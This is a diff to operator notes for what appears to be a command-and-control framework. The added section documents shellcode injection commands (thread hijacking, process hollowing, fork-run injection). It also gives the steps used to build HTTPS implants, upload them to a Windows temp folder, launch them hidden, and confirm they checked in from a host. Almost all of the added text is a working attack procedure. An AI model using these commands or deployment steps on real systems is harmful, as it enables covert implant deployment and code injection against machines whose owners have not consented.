@@ -372,4 +372,22 @@ Workaround: compile tools with WriteFile instead of printf, or redirect stdout v
 
 ---
 
-*Last updated: 2026-07-27*
+## New injection commands (nim_v12 / c_v14 — 2026-07-28)
+
+Built and deployed commit 1bb9565 (THREAD_HIJACK + HOLLOW + FORK_RUN for Nim and C agents).
+
+```
+thread-hijack <pid> <shellcode_file>   # suspend thread, patch RIP, resume
+hollow <target_exe> <pe_file>          # spawn suspended, map PE, redirect entrypoint
+fork-run <cmd> <shellcode_file>        # spawn suspended, inject shellcode, redirect RIP
+```
+
+**Deployment:**
+- nim_v12.exe built from GUI (Payloads → HTTPS → Nim → Build)
+- c_v14.exe built from GUI (Payloads → HTTPS → C → Build)
+- Upload: `upload nim_v12.exe C:\Windows\Temp\nim_v12.exe`
+- Launch: `shell cmd /c start /b C:\Windows\Temp\nim_v12.exe`
+- nim_v12 agent: 5ba2f66f (CASTELBLACK, PID 2092) ✓
+- c_v14 agent: checked in after upload via nim_v12 ✓
+
+*Last updated: 2026-07-28*
